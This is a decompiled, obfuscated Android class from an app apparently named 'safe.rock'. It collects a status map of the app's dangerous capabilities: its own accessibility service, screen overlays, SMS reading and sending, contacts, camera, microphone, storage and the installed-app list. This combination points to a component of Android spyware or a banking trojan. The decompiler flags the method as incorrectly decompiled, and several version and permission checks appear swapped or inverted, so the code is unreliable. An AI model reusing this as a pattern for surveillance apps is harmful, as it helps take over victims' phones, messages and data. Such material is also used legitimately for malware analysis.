package p000;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.util.Map;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public abstract class an0 {

    /* renamed from: a0 */
    public static final String f43729a0 = StringUtil.m212470a0("O1wDN0QrHydYPxRKBTtZLR8=");

    /* JADX WARN: Can't wrap try/catch for region: R(30:0|2|(4:73|3|(1:5)|6)|(27:8|(0)(1:11)|13|71|14|17|69|18|(2:20|(1:22)(1:23))(1:24)|25|(1:30)(1:29)|34|(1:36)(1:37)|38|(1:40)(1:41)|42|(1:44)(1:45)|46|(1:48)(1:49)|50|(1:52)(1:53)|54|(1:56)(2:57|(1:59)(1:60))|61|(1:63)(1:64)|65|66)|12|13|71|14|17|69|18|(0)(0)|25|(2:27|30)(2:31|30)|34|(0)(0)|38|(0)(0)|42|(0)(0)|46|(0)(0)|50|(0)(0)|54|(0)(0)|61|(0)(0)|65|66) */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x0053, code lost:
    
        r1 = false;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x007c, code lost:
    
        r4 = false;
     */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0065 A[Catch: Exception -> 0x006f, TryCatch #0 {Exception -> 0x006f, blocks: (B:18:0x0061, B:20:0x0065, B:24:0x0071), top: B:69:0x0061 }] */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0071 A[Catch: Exception -> 0x006f, TRY_LEAVE, TryCatch #0 {Exception -> 0x006f, blocks: (B:18:0x0061, B:20:0x0065, B:24:0x0071), top: B:69:0x0061 }] */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00b3  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00b5  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00c9  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00cb  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00df  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00e1  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00f5  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00f7  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x010b  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x010d  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x011d  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x0122  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x013a  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0147  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static Map m209824a0(Context context) {
        boolean z;
        String name;
        String str;
        String string;
        String strM212470a0 = StringUtil.m212470a0("KloSP14rBSxePSJNCA==");
        try {
            name = dqtvuisjd.class.getName();
            str = context.getPackageName() + "/" + name;
            string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
            if (string == null) {
                string = "";
            }
        } catch (Exception unused) {
        }
        if (!AbstractC0779a1.m213652a5(string, str, false)) {
            if (!AbstractC0779a1.m213652a5(string, name, false)) {
                z = false;
            }
            Pair pair = new Pair(strM212470a0, Boolean.valueOf(z));
            boolean zCanDrawOverlays = Settings.canDrawOverlays(context);
            Pair pair2 = new Pair("overlay", Boolean.valueOf(zCanDrawOverlays));
            boolean zM214005a0 = Build.VERSION.SDK_INT < 33 ? AbstractC1117qo.m214411a7(context, "android.permission.POST_NOTIFICATIONS") == 0 : mk0.m214005a0(new nk0(context).f58645a0);
            Pair pair3 = new Pair("notification", Boolean.valueOf(zM214005a0));
            int i = Build.VERSION.SDK_INT;
            return AbstractC0770a1.m213614f9(pair, pair2, pair3, new Pair("photo", Boolean.valueOf(i >= 33 ? AbstractC1117qo.m214411a7(context, "android.permission.READ_EXTERNAL_STORAGE") == 0 : AbstractC1117qo.m214411a7(context, "android.permission.READ_MEDIA_IMAGES") == 0)), new Pair("contacts", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.READ_CONTACTS") != 0)), new Pair("readSms", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.READ_SMS") != 0)), new Pair("sendSms", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.SEND_SMS") != 0)), new Pair("camera", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.CAMERA") != 0)), new Pair("microphone", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.RECORD_AUDIO") != 0)), new Pair("storage", Boolean.valueOf(i < 30 ? Environment.isExternalStorageManager() : AbstractC1117qo.m214411a7(context, "android.permission.WRITE_EXTERNAL_STORAGE") == 0)), new Pair("appList", Boolean.valueOf(i < 30 ? context.getSharedPreferences(f43729a0, 0).getBoolean("app_list_permission", false) : true)));
        }
        z = true;
        Pair pair4 = new Pair(strM212470a0, Boolean.valueOf(z));
        boolean zCanDrawOverlays2 = Settings.canDrawOverlays(context);
        Pair pair22 = new Pair("overlay", Boolean.valueOf(zCanDrawOverlays2));
        if (Build.VERSION.SDK_INT < 33) {
        }
        Pair pair32 = new Pair("notification", Boolean.valueOf(zM214005a0));
        int i2 = Build.VERSION.SDK_INT;
        return AbstractC0770a1.m213614f9(pair4, pair22, pair32, new Pair("photo", Boolean.valueOf(i2 >= 33 ? AbstractC1117qo.m214411a7(context, "android.permission.READ_EXTERNAL_STORAGE") == 0 : AbstractC1117qo.m214411a7(context, "android.permission.READ_MEDIA_IMAGES") == 0)), new Pair("contacts", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.READ_CONTACTS") != 0)), new Pair("readSms", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.READ_SMS") != 0)), new Pair("sendSms", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.SEND_SMS") != 0)), new Pair("camera", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.CAMERA") != 0)), new Pair("microphone", Boolean.valueOf(AbstractC1117qo.m214411a7(context, "android.permission.RECORD_AUDIO") != 0)), new Pair("storage", Boolean.valueOf(i2 < 30 ? Environment.isExternalStorageManager() : AbstractC1117qo.m214411a7(context, "android.permission.WRITE_EXTERNAL_STORAGE") == 0)), new Pair("appList", Boolean.valueOf(i2 < 30 ? context.getSharedPreferences(f43729a0, 0).getBoolean("app_list_permission", false) : true)));
    }
}
